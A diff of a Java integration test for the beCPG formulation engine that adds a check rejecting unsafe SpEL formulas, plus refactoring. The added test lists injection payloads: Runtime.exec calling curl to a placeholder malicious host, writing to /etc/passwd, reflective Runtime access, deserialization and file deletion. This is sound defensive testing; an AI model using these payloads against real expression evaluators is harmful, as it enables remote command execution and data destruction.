@@ -67,7 +67,7 @@ public class FormulaFormulationIT extends AbstractFinishedProductTest {
 
 	@Autowired
 	private AlfrescoRepository<RepositoryEntity> alfrescoRepository;
-	
+
 	@Autowired
 	private FormulationService<FormulatedEntity> formulationService;
 
@@ -77,10 +77,83 @@ public class FormulaFormulationIT extends AbstractFinishedProductTest {
 		// create RM and lSF
 		initParts();
 	}
+
+	@Test
+	public void testUnsafeFormulas() {
+
+		List<String> unsafeFormulas = List.of("T(java.lang.Runtime).getRuntime().exec('curl http://malicious-site.com')",
+				"T(java.nio.file.Files).write(java.nio.file.Paths.get('/etc/passwd'), 'malicious content'.getBytes())",
+				"T(java.lang.Class).forName('java.lang.Runtime').getDeclaredMethod('getRuntime').setAccessible(true).invoke(null)",
+				"T(java.io.ObjectInputStream).newInstance(new java.io.FileInputStream('/tmp/malicious_object.ser')).readObject()",
+				"''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(''.getClass().forName('java.lang.Runtime')).exec('echo TEST')",
+				"T(sun.misc.Unsafe).getUnsafe().allocateMemory(1024 * 1024 * 10)",
+				"T(org.apache.commons.io.FileUtils).forceDelete(new java.io.File('/path/to/sensitive/file'))");
+
+		for (String unsafeFormula : unsafeFormulas) {
+			NodeRef finishedProductDataNodeRef = inWriteTx(() -> {
+				FinishedProductData finishedProductData = new FinishedProductData();
+				finishedProductData.setName("test FP " + unsafeFormula.hashCode());
+				List<DynamicCharactListItem> dynamicCharactListItems = new ArrayList<>();
+				dynamicCharactListItems.add(new DynamicCharactListItem("formula", unsafeFormula));
+				finishedProductData.getCompoListView().setDynamicCharactList(dynamicCharactListItems);
+				alfrescoRepository.create(getTestFolderNodeRef(), finishedProductData);
+				return finishedProductData.getNodeRef();
+			});
+
+			inWriteTx(() -> {
+				L2CacheSupport.doInCacheContext(
+						() -> AuthenticationUtil
+								.runAsSystem(() -> formulationService.formulate(finishedProductDataNodeRef, FormulationService.DEFAULT_CHAIN_ID)),
+						false, true);
+				return true;
+			});
+
+			inReadTx(() -> {
+				FinishedProductData finishedProductData = (FinishedProductData) alfrescoRepository.findOne(finishedProductDataNodeRef);
+				DynamicCharactListItem dynamicCharactListItem = finishedProductData.getCompoListView().getDynamicCharactList().get(0);
+				assertTrue(dynamicCharactListItem.getErrorLog().toString().contains("Type is not authorized")
+						|| dynamicCharactListItem.getErrorLog().toString().contains("Expression is unsafe"));
+				return null;
+			});
+		}
+	}
+	
+	@Test
+	public void testSafeFormula() {
+		
+		List<String> safeFormulas = List.of("@beCPG.join(\", \", {\" test \"})");
+		
+		for (String unsafeFormula : safeFormulas) {
+			NodeRef finishedProductDataNodeRef = inWriteTx(() -> {
+				FinishedProductData finishedProductData = new FinishedProductData();
+				finishedProductData.setName("test FP " + unsafeFormula.hashCode());
+				List<DynamicCharactListItem> dynamicCharactListItems = new ArrayList<>();
+				dynamicCharactListItems.add(new DynamicCharactListItem("formula", unsafeFormula));
+				finishedProductData.getCompoListView().setDynamicCharactList(dynamicCharactListItems);
+				alfrescoRepository.create(getTestFolderNodeRef(), finishedProductData);
+				return finishedProductData.getNodeRef();
+			});
+			
+			inWriteTx(() -> {
+				L2CacheSupport.doInCacheContext(
+						() -> AuthenticationUtil
+						.runAsSystem(() -> formulationService.formulate(finishedProductDataNodeRef, FormulationService.DEFAULT_CHAIN_ID)),
+						false, true);
+				return true;
+			});
+			
+			inReadTx(() -> {
+				FinishedProductData finishedProductData = (FinishedProductData) alfrescoRepository.findOne(finishedProductDataNodeRef);
+				DynamicCharactListItem dynamicCharactListItem = finishedProductData.getCompoListView().getDynamicCharactList().get(0);
+				assertTrue(dynamicCharactListItem.getErrorLog() == null);
+				return null;
+			});
+		}
+	}
 	
 	@Test
 	public void testAuthorizedTypes() {
-		
+
 		NodeRef finishedProductDataNodeRef = inWriteTx(() -> {
 
 			FinishedProductData finishedProductData = new FinishedProductData();
@@ -94,21 +167,22 @@ public class FormulaFormulationIT extends AbstractFinishedProductTest {
 			alfrescoRepository.create(getTestFolderNodeRef(), finishedProductData);
 			return finishedProductData.getNodeRef();
 		});
-		
+
 		inWriteTx(() -> {
-			 L2CacheSupport.doInCacheContext(() -> AuthenticationUtil.runAsSystem(() -> {
-				return formulationService.formulate(finishedProductDataNodeRef, FormulationService.DEFAULT_CHAIN_ID);
-			}), false, true);
-			 return true;
+			L2CacheSupport.doInCacheContext(
+					() -> AuthenticationUtil
+							.runAsSystem(() -> formulationService.formulate(finishedProductDataNodeRef, FormulationService.DEFAULT_CHAIN_ID)),
+					false, true);
+			return true;
 		});
-		
+
 		inReadTx(() -> {
 			FinishedProductData finishedProductData = (FinishedProductData) alfrescoRepository.findOne(finishedProductDataNodeRef);
 			DynamicCharactListItem dynamicCharactListItem = finishedProductData.getCompoListView().getDynamicCharactList().get(0);
 			assertEquals("class fr.becpg.repo.product.data.RawMaterialData", dynamicCharactListItem.getValue().toString());
 			return null;
 		});
-		
+
 		inWriteTx(() -> {
 			FinishedProductData finishedProductData = (FinishedProductData) alfrescoRepository.findOne(finishedProductDataNodeRef);
 			List<DynamicCharactListItem> dynamicCharactList = finishedProductData.getCompoListView().getDynamicCharactList();
@@ -116,14 +190,15 @@ public class FormulaFormulationIT extends AbstractFinishedProductTest {
 			dynamicCharactList.add(new DynamicCharactListItem("formula", "T(java.lang.System).toString();"));
 			return alfrescoRepository.save(finishedProductData);
 		});
-		
+
 		inWriteTx(() -> {
-			L2CacheSupport.doInCacheContext(() -> AuthenticationUtil.runAsSystem(() -> {
-				return formulationService.formulate(finishedProductDataNodeRef, FormulationService.DEFAULT_CHAIN_ID);
-			}), false, true);
+			L2CacheSupport.doInCacheContext(
+					() -> AuthenticationUtil
+							.runAsSystem(() -> formulationService.formulate(finishedProductDataNodeRef, FormulationService.DEFAULT_CHAIN_ID)),
+					false, true);
 			return true;
 		});
-		
+
 		inReadTx(() -> {
 			FinishedProductData finishedProductData = (FinishedProductData) alfrescoRepository.findOne(finishedProductDataNodeRef);
 			DynamicCharactListItem dynamicCharactListItem = finishedProductData.getCompoListView().getDynamicCharactList().get(0);
@@ -133,7 +208,7 @@ public class FormulaFormulationIT extends AbstractFinishedProductTest {
 	}
 
 	@Test
-	public void testCopyHelperFormula() throws Exception {
+	public void testCopyHelperFormula() {
 
 		NodeRef finishedProductData1NodeRef = inWriteTx(() -> {
 
@@ -146,8 +221,10 @@ public class FormulaFormulationIT extends AbstractFinishedProductTest {
 			finishedProductData1.setLegalName("Test Spel Formula 1");
 
 			List<CompoListDataItem> compoList = new ArrayList<>();
-			compoList.add(new CompoListDataItem(null, null, null, 1d, ProductUnit.kg, 0d, DeclarationType.Detail, localSF1NodeRef));
-			compoList.add(new CompoListDataItem(null, compoList.get(0), null, 1d, ProductUnit.kg, 0d, DeclarationType.Declare, rawMaterial1NodeRef));
+			compoList.add(CompoListDataItem.build().withQtyUsed(1d).withUnit(ProductUnit.kg).withLossPerc(0d)
+					.withDeclarationType(DeclarationType.Detail).withProduct(localSF1NodeRef));
+			compoList.add(CompoListDataItem.build().withParent(compoList.get(0)).withQtyUsed(1d).withUnit(ProductUnit.kg).withLossPerc(0d)
+					.withDeclarationType(DeclarationType.Declare).withProduct(rawMaterial1NodeRef));
 			finishedProductData1.getCompoListView().setCompoList(compoList);
 
 			List<CostListDataItem> costList = new ArrayList<>();
@@ -155,7 +232,7 @@ public class FormulaFormulationIT extends AbstractFinishedProductTest {
 			finishedProductData1.setCostList(costList);
 
 			List<NutListDataItem> nutList = new ArrayList<>();
-			nutList.add(new NutListDataItem(null, null, null, null, null, null, nut1, null));
+			nutList.add(NutListDataItem.build().withNut(nut1));
 			finishedProductData1.setNutList(nutList);
 
 			alfrescoRepository.create(getTestFolderNodeRef(), finishedProductData1);
@@ -184,7 +261,6 @@ public class FormulaFormulationIT extends AbstractFinishedProductTest {
 			return finishedProductData2.getNodeRef();
 
 		});
-		
 
 		NodeRef finishedProductData3NodeRef = inWriteTx(() -> {
 
@@ -203,19 +279,17 @@ public class FormulaFormulationIT extends AbstractFinishedProductTest {
 
 		});
 
-
 		inWriteTx(() -> {
 
 			FinishedProductData finishedProductData2 = (FinishedProductData) alfrescoRepository.findOne(finishedProductData2NodeRef);
 			FinishedProductData finishedProductData1 = (FinishedProductData) alfrescoRepository.findOne(finishedProductData1NodeRef);
 			FinishedProductData finishedProductData3 = (FinishedProductData) alfrescoRepository.findOne(finishedProductData3NodeRef);
-			
 
 			assertEquals(2, finishedProductData1.getSuppliers().size());
 			assertEquals("Client 1", finishedProductData1.getClients().get(0).getName());
 
 			productService.formulate(finishedProductData2);
-			
+
 			productService.formulate(finishedProductData3);
 
 			logger.debug(finishedProductData2.toString());
@@ -224,10 +298,10 @@ public class FormulaFormulationIT extends AbstractFinishedProductTest {
 			assertEquals(1, finishedProductData2.getCostList().size());
 			assertEquals(2, finishedProductData2.getCompoList().size());
 			assertEquals(1, finishedProductData2.getCompoListView().getDynamicCharactList().size());
-			
+
 			assertEquals(2, finishedProductData3.getCompoList().size());
 			assertEquals(1, finishedProductData3.getCompoListView().getDynamicCharactList().size());
-			
+
 			assertEquals("Client 1", finishedProductData2.getClients().get(0).getName());
 			assertEquals(2, finishedProductData2.getSuppliers().size());
 			assertEquals(1, associationService.getTargetAssocs(finishedProductData2.getNodeRef(), PLMModel.ASSOC_CLIENTS).size());
@@ -237,101 +311,104 @@ public class FormulaFormulationIT extends AbstractFinishedProductTest {
 		});
 
 	}
-	
+
 	@Test
 	public void testRecursiveFormula() {
 		NodeRef finishedProductDataNodeRef = inWriteTx(() -> {
 
-			SemiFinishedProductData SF2 = new SemiFinishedProductData();
-			SF2.setName("SF2");
-			NodeRef sf2NodeRef = alfrescoRepository.create(getTestFolderNodeRef(), SF2).getNodeRef();
-			
-			SemiFinishedProductData SF1 = new SemiFinishedProductData();
-			SF1.setName("SF1");
-			SF1.getCompoListView().setCompoList(Arrays.asList(new CompoListDataItem(null, null, null, 1d, ProductUnit.kg, 0d, DeclarationType.Detail, sf2NodeRef)));
-			NodeRef sf1NodeRef = alfrescoRepository.create(getTestFolderNodeRef(), SF1).getNodeRef();
-			
-			SF2.getCompoListView().setCompoList(Arrays.asList(new CompoListDataItem(null, null, null, 1d, ProductUnit.kg, 0d, DeclarationType.Detail, sf1NodeRef)));
-			alfrescoRepository.save(SF2);
-			
-			SemiFinishedProductData SF3 = new SemiFinishedProductData();
-			SF3.setName("SF3");
-			NodeRef sf3NodeRef = alfrescoRepository.create(getTestFolderNodeRef(), SF3).getNodeRef();
-			
-			SemiFinishedProductData SF4 = new SemiFinishedProductData();
-			SF4.setName("SF4");
-			NodeRef sf4NodeRef = alfrescoRepository.create(getTestFolderNodeRef(), SF4).getNodeRef();
-			
-			SemiFinishedProductData SF5 = new SemiFinishedProductData();
-			SF5.setName("SF5");
-			NodeRef sf5NodeRef = alfrescoRepository.create(getTestFolderNodeRef(), SF5).getNodeRef();
-			
-			SF4.getCompoListView().setCompoList(Arrays.asList(new CompoListDataItem(null, null, null, 1d, ProductUnit.kg, 0d, DeclarationType.Detail, sf5NodeRef)));
-			alfrescoRepository.save(SF4);
-			
+			SemiFinishedProductData sf2 = new SemiFinishedProductData();
+			sf2.setName("SF2");
+			NodeRef sf2NodeRef = alfrescoRepository.create(getTestFolderNodeRef(), sf2).getNodeRef();
+
+			SemiFinishedProductData sf1 = new SemiFinishedProductData();
+			sf1.setName("SF1");
+			sf1.getCompoListView().setCompoList(Arrays.asList(CompoListDataItem.build().withQtyUsed(1d).withUnit(ProductUnit.kg).withLossPerc(0d)
+					.withDeclarationType(DeclarationType.Detail).withProduct(sf2NodeRef)));
+			NodeRef sf1NodeRef = alfrescoRepository.create(getTestFolderNodeRef(), sf1).getNodeRef();
+
+			sf2.getCompoListView().setCompoList(Arrays.asList(CompoListDataItem.build().withQtyUsed(1d).withUnit(ProductUnit.kg).withLossPerc(0d)
+					.withDeclarationType(DeclarationType.Detail).withProduct(sf1NodeRef)));
+			alfrescoRepository.save(sf2);
+
+			SemiFinishedProductData sf3 = new SemiFinishedProductData();
+			sf3.setName("SF3");
+			NodeRef sf3NodeRef = alfrescoRepository.create(getTestFolderNodeRef(), sf3).getNodeRef();
+
+			SemiFinishedProductData sf4 = new SemiFinishedProductData();
+			sf4.setName("SF4");
+			NodeRef sf4NodeRef = alfrescoRepository.create(getTestFolderNodeRef(), sf4).getNodeRef();
+
+			SemiFinishedProductData sf5 = new SemiFinishedProductData();
+			sf5.setName("SF5");
+			NodeRef sf5NodeRef = alfrescoRepository.create(getTestFolderNodeRef(), sf5).getNodeRef();
+
+			sf4.getCompoListView().setCompoList(Arrays.asList(CompoListDataItem.build().withQtyUsed(1d).withUnit(ProductUnit.kg).withLossPerc(0d)
+					.withDeclarationType(DeclarationType.Detail).withProduct(sf5NodeRef)));
+			alfrescoRepository.save(sf4);
+
 			List<CompoListDataItem> compoList = new ArrayList<>();
-			compoList.add(new CompoListDataItem(null, null, null, 1d, ProductUnit.kg, 0d, DeclarationType.Detail, sf4NodeRef));
-			compoList.add(new CompoListDataItem(null, null, null, 5d, ProductUnit.kg, 0d, DeclarationType.Detail, sf4NodeRef));
-			SF3.getCompoListView().setCompoList(compoList);
+			compoList.add(CompoListDataItem.build().withQtyUsed(1d).withUnit(ProductUnit.kg).withLossPerc(0d)
+					.withDeclarationType(DeclarationType.Detail).withProduct(sf4NodeRef));
+			compoList.add(CompoListDataItem.build().withQtyUsed(5d).withUnit(ProductUnit.kg).withLossPerc(0d)
+					.withDeclarationType(DeclarationType.Detail).withProduct(sf4NodeRef));
 
-			alfrescoRepository.save(SF3);
+			sf3.getCompoListView().setCompoList(compoList);
+			alfrescoRepository.save(sf3);
 
-			FinishedProductData FP1 = new FinishedProductData();
-			FP1.setName("FP1");
-			
-			DynamicCharactListItem dynListChar = new DynamicCharactListItem("formula", "90");
-			dynListChar.setMultiLevelFormula(true);
-			
-			dynListChar.setColumnName("bcpg_dynamicCharactColumn1");
-			
-			FP1.getCompoListView().setDynamicCharactList(Arrays.asList(dynListChar));
-			
+			FinishedProductData fp1 = new FinishedProductData();
+			fp1.setName("FP1");
+
+			DynamicCharactListItem dynamicChar = new DynamicCharactListItem("formula", "90");
+			dynamicChar.setMultiLevelFormula(true);
+			dynamicChar.setColumnName("bcpg_dynamicCharactColumn1");
+
+			fp1.getCompoListView().setDynamicCharactList(Arrays.asList(dynamicChar));
+
 			List<CompoListDataItem> compoListFP = new ArrayList<>();
-			compoListFP.add(new CompoListDataItem(null, null, null, 1d, ProductUnit.kg, 0d, DeclarationType.Detail, sf1NodeRef));
-			compoListFP.add(new CompoListDataItem(null, null, null, 1d, ProductUnit.kg, 0d, DeclarationType.Detail, sf3NodeRef));
-			FP1.getCompoListView().setCompoList(compoListFP);
-			
-			alfrescoRepository.create(getTestFolderNodeRef(), FP1);
+			compoListFP.add(CompoListDataItem.build().withQtyUsed(1d).withUnit(ProductUnit.kg).withLossPerc(0d)
+					.withDeclarationType(DeclarationType.Detail).withProduct(sf1NodeRef));
+			compoListFP.add(CompoListDataItem.build().withQtyUsed(1d).withUnit(ProductUnit.kg).withLossPerc(0d)
+					.withDeclarationType(DeclarationType.Detail).withProduct(sf3NodeRef));
+			fp1.getCompoListView().setCompoList(compoListFP);
 
-			return FP1.getNodeRef();
+			alfrescoRepository.create(getTestFolderNodeRef(), fp1);
 
+			return fp1.getNodeRef();
 		});
-		
+
 		inWriteTx(() -> {
-			 L2CacheSupport.doInCacheContext(() -> AuthenticationUtil.runAsSystem(() -> {
-				return formulationService.formulate(finishedProductDataNodeRef, FormulationService.DEFAULT_CHAIN_ID);
-			}), false, true);
-			 return true;
+			L2CacheSupport.doInCacheContext(
+					() -> AuthenticationUtil
+							.runAsSystem(() -> formulationService.formulate(finishedProductDataNodeRef, FormulationService.DEFAULT_CHAIN_ID)),
+					false, true);
+			return true;
 		});
-			
+
 		inWriteTx(() -> {
-			FinishedProductData FP1 = (FinishedProductData) alfrescoRepository.findOne(finishedProductDataNodeRef);
+			FinishedProductData fp1 = (FinishedProductData) alfrescoRepository.findOne(finishedProductDataNodeRef);
 
 			int checks = 0;
-			
-			for (CompoListDataItem item : FP1.getCompoList()) {
-				
-				SemiFinishedProductData SF = (SemiFinishedProductData) alfrescoRepository.findOne(item.getProduct());
-				
-				Serializable dynCol = nodeService.getProperty(item.getNodeRef(), QName.createQName(BeCPGModel.BECPG_URI, "dynamicCharactColumn1"));
-				
-				assertNotNull(dynCol);
-				
-				if ("SF1".equals(SF.getName())) {
-					JSONObject json = new JSONObject(dynCol.toString());
+
+			for (CompoListDataItem item : fp1.getCompoList()) {
+				SemiFinishedProductData semiFinishedProduct = (SemiFinishedProductData) alfrescoRepository.findOne(item.getProduct());
+				Serializable dynamicCol = nodeService.getProperty(item.getNodeRef(),
+						QName.createQName(BeCPGModel.BECPG_URI, "dynamicCharactColumn1"));
+
+				assertNotNull(dynamicCol);
+
+				JSONObject json = new JSONObject(dynamicCol.toString());
+				if ("SF1".equals(semiFinishedProduct.getName())) {
 					assertEquals(3, ((JSONArray) json.get("sub")).length());
 					checks++;
-				} else if ("SF3".equals(SF.getName())) {
-					JSONObject json = new JSONObject(dynCol.toString());
+				} else if ("SF3".equals(semiFinishedProduct.getName())) {
 					assertEquals(4, ((JSONArray) json.get("sub")).length());
 					checks++;
 				}
 			}
 
 			assertEquals(2, checks);
-			
-			return FP1.getNodeRef();
+			return fp1.getNodeRef();
 		});
-
 	}
+
 }
